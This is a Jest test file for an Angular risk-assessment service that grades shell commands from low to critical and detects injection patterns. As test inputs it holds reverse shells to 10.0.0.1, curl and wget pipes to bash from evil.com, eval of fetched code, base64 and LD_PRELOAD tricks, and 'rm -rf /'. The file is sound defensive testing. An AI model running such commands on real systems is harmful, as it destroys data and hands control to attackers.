import { TestBed } from '@angular/core/testing'
import { RiskAssessmentService } from './risk-assessment.service'
import { LoggerService } from '../core/logger.service'
import { RiskLevel } from '../../types/security.types'

// Mock LoggerService
class MockLoggerService {
    info = jest.fn()
    error = jest.fn()
    warn = jest.fn()
    debug = jest.fn()
}

describe('RiskAssessmentService', () => {
    let service: RiskAssessmentService
    let mockLogger: MockLoggerService

    beforeEach(() => {
        TestBed.configureTestingModule({
            providers: [
                RiskAssessmentService,
                { provide: LoggerService, useClass: MockLoggerService },
            ],
        })

        service = TestBed.inject(RiskAssessmentService)
        mockLogger = TestBed.inject(LoggerService) as any
    })

    it('should be created', () => {
        expect(service).toBeTruthy()
    })

    describe('assessRisk', () => {
        it('should return LOW for safe readonly commands', async () => {
            const level = await service.assessRisk('ls -la')
            expect(level).toBe(RiskLevel.LOW)
        })

        it('should return LOW for cat command', async () => {
            const level = await service.assessRisk('cat README.md')
            expect(level).toBe(RiskLevel.LOW)
        })

        it('should return CRITICAL for rm -rf /', async () => {
            const level = await service.assessRisk('rm -rf /')
            expect(level).toBe(RiskLevel.CRITICAL)
        })

        it('should return CRITICAL for sudo rm', async () => {
            const level = await service.assessRisk('sudo rm -rf /home')
            expect(level).toBe(RiskLevel.CRITICAL)
        })
    })

    describe('performAssessment', () => {
        it('should return detailed assessment with patterns', async () => {
            const assessment = await service.performAssessment('rm -rf /')

            expect(assessment.level).toBe(RiskLevel.CRITICAL)
            expect(assessment.score).toBeGreaterThan(0)
            expect(assessment.reasons.length).toBeGreaterThan(0)
            expect(assessment.patterns.length).toBeGreaterThan(0)
        })

        it('should include suggestions', async () => {
            const assessment = await service.performAssessment('chmod 777 file')

            expect(assessment.suggestions).toBeDefined()
            expect(assessment.suggestions!.length).toBeGreaterThan(0)
        })
    })

    describe('Command Injection Detection', () => {
        it('should detect command substitution $(...)', async () => {
            const assessment = await service.performAssessment('echo $(whoami)')

            expect(assessment.injectionPatterns).toBeDefined()
            expect(assessment.injectionPatterns!.some(
                p => p.category === 'command-substitution'
            )).toBe(true)
        })

        it('should detect backtick command substitution', async () => {
            const assessment = await service.performAssessment('echo `id`')

            expect(assessment.injectionPatterns).toBeDefined()
            expect(assessment.injectionPatterns!.some(
                p => p.category === 'command-substitution'
            )).toBe(true)
        })

        it('should detect reverse shell via /dev/tcp', async () => {
            const assessment = await service.performAssessment(
                'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
            )

            expect(assessment.injectionPatterns).toBeDefined()
            expect(assessment.injectionPatterns!.some(
                p => p.category === 'reverse-shell'
            )).toBe(true)
            expect(assessment.level).toBe(RiskLevel.CRITICAL)
        })

        it('should detect netcat reverse shell', async () => {
            const assessment = await service.performAssessment('nc -e /bin/sh 10.0.0.1 4444')

            expect(assessment.injectionPatterns).toBeDefined()
            expect(assessment.injectionPatterns!.some(
                p => p.category === 'reverse-shell'
            )).toBe(true)
        })

        it('should detect remote script execution (curl | bash)', async () => {
            const assessment = await service.performAssessment('curl https://example.com/script.sh | bash')

            expect(assessment.injectionPatterns).toBeDefined()
            expect(assessment.injectionPatterns!.some(
                p => p.category === 'remote-execution'
            )).toBe(true)
            expect(assessment.level).toBe(RiskLevel.CRITICAL)
        })

        it('should detect wget remote execution', async () => {
            const assessment = await service.performAssessment(
                'wget -qO- https://evil.com/malware.sh | sh'
            )

            expect(assessment.injectionPatterns).toBeDefined()
            expect(assessment.level).toBe(RiskLevel.CRITICAL)
        })

        it('should detect base64 encoded bypass', async () => {
            const assessment = await service.performAssessment(
                'echo bWFsd2FyZQ== | base64 -d | bash'
            )

            expect(assessment.injectionPatterns).toBeDefined()
            expect(assessment.injectionPatterns!.some(
                p => p.category === 'encoding-bypass'
            )).toBe(true)
        })

        it('should detect LD_PRELOAD injection', async () => {
            const assessment = await service.performAssessment(
                'LD_PRELOAD=/tmp/evil.so /bin/bash'
            )

            expect(assessment.injectionPatterns).toBeDefined()
            expect(assessment.injectionPatterns!.some(
                p => p.category === 'environment-injection'
            )).toBe(true)
            expect(assessment.level).toBe(RiskLevel.CRITICAL)
        })

        it('should detect sudo privilege escalation', async () => {
            const assessment = await service.performAssessment('sudo -i')

            expect(assessment.injectionPatterns).toBeDefined()
            expect(assessment.injectionPatterns!.some(
                p => p.category === 'privilege-escalation'
            )).toBe(true)
        })

        it('should detect eval dynamic execution', async () => {
            const assessment = await service.performAssessment('eval "$(curl evil.com)"')

            expect(assessment.injectionPatterns).toBeDefined()
            expect(assessment.injectionPatterns!.some(
                p => p.category === 'encoding-bypass'
            )).toBe(true)
            expect(assessment.level).toBe(RiskLevel.CRITICAL)
        })
    })

    describe('performAssessment - injection severity', () => {
        it('should give higher score for multiple injection patterns', async () => {
            const assessment1 = await service.performAssessment('echo test')
            const assessment2 = await service.performAssessment(
                'curl evil.com | bash && $(whoami)'
            )

            expect(assessment2.score).toBeGreaterThan(assessment1.score)
        })

        it('should detect critical injection categories', async () => {
            const assessment = await service.performAssessment(
                'bash -c "$(curl evil.com/shell.sh)"'
            )

            // Should have multiple critical patterns
            expect(assessment.injectionPatterns).toBeDefined()
            expect(assessment.injectionPatterns!.length).toBeGreaterThan(0)
        })
    })

    describe('isDangerous', () => {
        it('should return true for HIGH risk commands', async () => {
            const isDangerous = await service.isDangerous('chmod 777 /etc/passwd')
            expect(isDangerous).toBe(true)
        })

        it('should return true for CRITICAL risk commands', async () => {
            const isDangerous = await service.isDangerous('rm -rf /')
            expect(isDangerous).toBe(true)
        })

        it('should return false for LOW risk commands', async () => {
            const isDangerous = await service.isDangerous('ls -la')
            expect(isDangerous).toBe(false)
        })
    })

    describe('getRiskLevelDescription', () => {
        it('should return correct description for each level', () => {
            expect(service.getRiskLevelDescription(RiskLevel.LOW)).toContain('安全')
            expect(service.getRiskLevelDescription(RiskLevel.MEDIUM)).toContain('需要注意')
            expect(service.getRiskLevelDescription(RiskLevel.HIGH)).toContain('危险')
            expect(service.getRiskLevelDescription(RiskLevel.CRITICAL)).toContain('极危险')
        })
    })

    describe('getRiskLevelColor', () => {
        it('should return valid color codes', () => {
            expect(service.getRiskLevelColor(RiskLevel.LOW)).toMatch(/^#[0-9a-f]{6}$/i)
            expect(service.getRiskLevelColor(RiskLevel.MEDIUM)).toMatch(/^#[0-9a-f]{6}$/i)
            expect(service.getRiskLevelColor(RiskLevel.HIGH)).toMatch(/^#[0-9a-f]{6}$/i)
            expect(service.getRiskLevelColor(RiskLevel.CRITICAL)).toMatch(/^#[0-9a-f]{6}$/i)
        })
    })

    describe('assessMultiple', () => {
        it('should assess multiple commands', async () => {
            const commands = ['ls', 'rm -rf /', 'cat file.txt']
            const results = await service.assessMultiple(commands)

            expect(results.length).toBe(3)
            expect(results[0].level).toBe(RiskLevel.LOW)
            expect(results[1].level).toBe(RiskLevel.CRITICAL)
            expect(results[2].level).toBe(RiskLevel.LOW)
        })
    })
})